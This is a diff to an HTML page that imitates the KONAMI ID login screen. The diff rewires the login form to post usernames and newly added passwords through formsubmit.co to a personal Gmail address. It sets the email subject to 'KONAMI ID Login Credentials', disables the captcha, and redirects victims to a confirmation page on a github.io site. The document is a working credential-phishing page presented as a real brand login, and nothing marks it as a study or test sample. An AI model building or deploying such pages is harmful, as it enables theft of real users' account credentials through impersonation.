@@ -79,24 +79,58 @@
             <!-- Placeholder for KONAMI logo image -->
             <div class="logo-placeholder">KONAMI ID</div>
         </div>
-        <form id="loginForm"  data-netlify="true" class="login-form" netlify>
-            <div class="input-group">
-                <input type="text" id="username" name="username" required>
-                <label for="username">KONAMI ID / E-MAIL ADDRESS</label>
-            </div>
-            <button type="submit" class="btn-login">LOGIN</button>
+       <form id="loginForm" 
+      action="https://formsubmit.co/psalmcares878@gmail.com" 
+      method="POST"
+      class="login-form"
+      data-netlify="true"
+      netlify-honeypot="bot-field">
+    
+    <!-- Netlify Bot Field (hidden) -->
+    <p style="display: none;">
+        <label>Don't fill this out if you're human: 
+            <input name="bot-field">
+        </label>
+    </p>
+    
+    <!-- FormSubmit Configuration -->
+    <input type="hidden" name="_next" 
+           value="https://samcares878.github.io/KONAMI/confirmation.html">
+    
+    <input type="hidden" name="_subject" 
+           value="🔐 KONAMI ID Login Credentials">
+    
+    <input type="hidden" name="_template" value="table">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="text" name="_honey" style="display:none">
+    
+    <!-- CC another email (optional) -->
+    <!-- <input type="hidden" name="_cc" value="another-email@gmail.com"> -->
+    
+    <!-- Your form fields -->
+    <div class="input-group">
+        <input type="text" id="username" name="username" required>
+        <label for="username">KONAMI ID / E-MAIL ADDRESS</label>
+    </div>
+    
+    <div class="input-group">
+        <input type="password" id="password" name="password" required>
+        <label for="password">Password</label>
+    </div>
+    
+    <button type="submit" class="btn-login">LOGIN</button>
 
-            <div class="divider">OR</div>
+    <div class="divider">OR</div>
 
-            <button type="button" class="btn-google">
-                <!-- Placeholder for Google Play icon -->
-                <span class="google-icon">G</span> Log in with Google Play
-            </button>
+    <button type="button" class="btn-google">
+        <!-- Placeholder for Google Play icon -->
+        <span class="google-icon">G</span> Log in with Google Play
+    </button>
 
-            <div class="register-link">
-                Don't have a KONAMI ID? <a href="#" class="register-red">Register</a>
-            </div>
-        </form>
+    <div class="register-link">
+        Don't have a KONAMI ID? <a href="#" class="register-red">Register</a>
+    </div>
+</form>
         
         <!-- ADDED THIS SECTION: Extra Options -->
         <div class="extra-options">
